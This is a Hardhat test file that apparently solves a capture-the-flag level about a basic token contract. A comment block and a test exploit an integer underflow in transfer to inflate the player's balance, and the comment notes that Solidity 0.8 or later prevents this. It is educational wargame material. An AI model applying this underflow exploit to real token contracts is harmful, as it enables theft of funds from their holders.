const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗
╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║
░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║
░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║
░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝
 
 * Goal:
 *
 * The goal of this level is for you to hack the basic token contract below.
 * You are given 20 tokens to start with and you will beat the level if you somehow 
 * manage to get your hands on any additional tokens. 
 * Preferably a very large amount of tokens.
 * 
 * Solution:
 *
 * To solve this level we need to know how integer
 * underflow / overflow works.
 * just call the transfer by passing any other address 
 * that is different from the caller (player) and a value 
 * greater then balance (in this case) that allows us to 
 * trigger the underflow/overflow control.
 * 
 * Note:
 * 
 * this works only with older solidity compiler.
 * To avoid underflow / overflow we need to use 
 * at least the 0.8 solidity version where 
 * in case of overflow / underflow the trx
 * revert.
 * 
 */
describe("Token", function () {
    let token, owner, player;

    before(async function () {
        // Contracts are deployed using the first signer/account by default
        [owner, player] = await ethers.getSigners();

        const Token = await ethers.getContractFactory("contracts/Token/Token.sol:Token");
        token = await Token.connect(owner).deploy(1000); // total supply chosen by me

        await token.connect(owner).transfer(player.address, 20);
    });

    describe("Transfer", async function () {
        it("Should increase the balance", async function () {
            const playerBalance = await token.connect(player).balanceOf(player.address);
            expect(playerBalance).to.be.eq(20);

            // solution: balance[player] = 20 ==> balance[player] -= 21 ==> balance[player] = -1 <-> max uint256 ==> underflow!
            await token.connect(player).transfer(ethers.constants.AddressZero, playerBalance + 1);
            const newPlayerBalance = await token.connect(player).balanceOf(player.address);
            expect(newPlayerBalance).to.greaterThan(playerBalance);
            
            console.log("older balance: ", playerBalance.toString());
            console.log("new balance: ", newPlayerBalance.toString());
        });
    });
});
